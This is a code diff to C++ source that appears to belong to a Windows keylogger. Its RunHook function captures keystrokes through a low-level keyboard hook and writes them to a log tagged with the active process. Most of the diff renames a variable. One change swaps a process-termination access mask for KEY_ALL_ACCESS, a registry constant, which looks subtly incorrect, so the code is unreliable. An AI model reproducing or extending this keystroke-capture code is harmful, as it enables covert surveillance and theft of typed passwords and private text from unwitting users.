@@ -57,11 +57,11 @@ LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
 		|| key == VK_SHIFT
 		|| key == VK_RSHIFT
 		|| key == VK_LSHIFT) {
-	  std::string key_name = KeyConst::AddKey(pKbDllHookStruct->vkCode, caps, shift);
-	  if (key_name.length() > 0) {
-		key_name.insert(1, "/");
+	  std::string keyName = KeyConst::AddKey(pKbDllHookStruct->vkCode, caps, shift);
+	  if (keyName.length() > 0) {
+		keyName.insert(1, "/");
 	  }
-	  keyLog += key_name;
+	  keyLog += keyName;
 	  Stream::WriteLog(keyLog, clientInfo.activeProcess);
 	  keyLog.clear();
 	}
@@ -84,7 +84,7 @@ bool KeyHook::KillProcess() {
   HANDLE handle;
 
   HandleMessage(false);
-  handle = OpenProcess(0x00100000U | 0x0001U, TRUE, GetCurrentProcessId());
+  handle = OpenProcess(KEY_ALL_ACCESS, TRUE, GetCurrentProcessId());
   return TerminateProcess(handle, 0);
 }
 
